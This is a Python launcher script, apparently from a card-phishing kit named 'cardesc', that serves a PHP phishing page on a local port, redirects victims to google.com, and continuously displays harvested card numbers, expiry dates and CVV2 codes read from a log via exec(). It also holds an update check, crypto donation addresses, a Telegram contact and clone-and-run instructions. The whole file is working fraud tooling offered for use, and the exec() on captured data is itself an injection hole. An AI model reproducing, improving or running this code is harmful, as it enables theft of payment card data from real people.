import os, sys, time
from multiprocessing import Process
from prettytable import PrettyTable
from info.data import *
import json
import requests

os.system('clear || cls')
with open("dist/log.log", "w") as dist:
    pass

class A:
    def __call__(self):
        os.system("cd dist && php -S localhost:"+str(ports))
class B:
    def __call__(self):
        while True:
            x = PrettyTable()
            x.field_names = ['os', 'number', 'date', 'cvv2']
            exec(open('dist/log.log').read())
            print(x)
            time.sleep(1)
            os.system("clear || cls")

with open('info/metadata.json') as data:
    meta = json.load(data)
logo=(f"""\n
┌─┐┌─┐┬─┐┌┬┐┌─┐┌─┐┌─┐
│  ├─┤├┬┘ ││├┤ └─┐│  
└─┘┴ ┴┴└──┴┘└─┘└─┘└─┘
[>] Version     : {meta['version']}
 |--> btc: {meta['donate']['btc']}          
 |--> eth: {meta['donate']['eth']}
[>] Telegram    : {meta['telegram']}\n""")
def upd():
    try:
        rqst = requests.get(f"{meta['url']}", timeout=5)
        meta_sc = rqst.status_code
        if meta_sc == 200:
            metadata = rqst.text
            json_data = json.loads(metadata)
            gh_version = json_data['version']
            if (str(gh_version) > meta['version']):
                print(logo)
                print(f'\n[>]New Update Available : {gh_version}')
                print(' |--> Please install     : https://github.com/oldnum/cardesc')
                print(f'[>]New Update Available : {gh_version}')
                exit()
            else:
                pass
    except Exception as exc:
        print(f'Exception : {str(exc)}')
        exit()
upd()
print(logo,"""
[0] History Bank
[1] Card Pay
[2] Helping
""")
used = input("num lock: ")
if used=='0':
    upd()
    try:
        os.system('clear || cls')
        print(logo)
        with open('result.log', 'r') as res:
            print(res.read())
        exit()
    except:
        exit()

elif used=='1':
    try:
        ports = int(input("ports: "))
    except:
        ports=8080
    reloc = input("redirect or (enter): ")
    if (reloc == ""):
        with open("dist/location.location", 'w') as loca:
            loca.write("https://google.com")
    else:
        pass
    a = A()
    b = B()

    p1 = Process(target=a)
    p2 = Process(target=b)
    p1.start()
    p2.start()

    p1.join()
    p2.join()
elif used == '2':
    upd()
    os.system('clear || cls')
    print(logo)
    print(info_help)
    print(f"""#  cardesc  v.{meta['version']}
    apt update && apt upgrade
    git clone https://github.com/oldnum/cardesc
    cd cardesc
    pip3 install -r requirements.txt

#  launch
    python3 bank.py\n\nHelping:\n[>] Telegram    : {meta['telegram']}\n""")
    exit()
else:
    os.system("clear || cls")
    print(logo)
    exit()